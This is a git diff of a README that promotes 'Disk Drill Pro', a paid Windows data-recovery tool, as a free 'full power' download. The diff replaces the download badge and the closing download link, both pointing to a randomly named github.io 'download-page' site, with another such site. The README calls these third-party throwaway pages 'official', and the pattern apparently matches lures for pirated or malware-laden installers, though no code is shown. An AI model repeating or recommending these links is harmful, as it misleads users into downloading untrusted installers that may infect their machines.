@@ -2,7 +2,7 @@
 
 Discover the full power of **Disk Drill Pro**, the ultimate data recovery solution for Windows in 2026. This comprehensive toolkit provides deep-level scanning, advanced file restoration, and robust data protection features to safeguard your digital assets. Whether you've accidentally deleted files or need to recover data from a corrupted drive, Disk Drill Pro offers a professional-grade solution right on your desktop.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -54,7 +54,7 @@ A: First, check the physical connections and ensure the drive is powered on. In 
 
 For the most stable and secure version of the software, please use the official download link provided.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
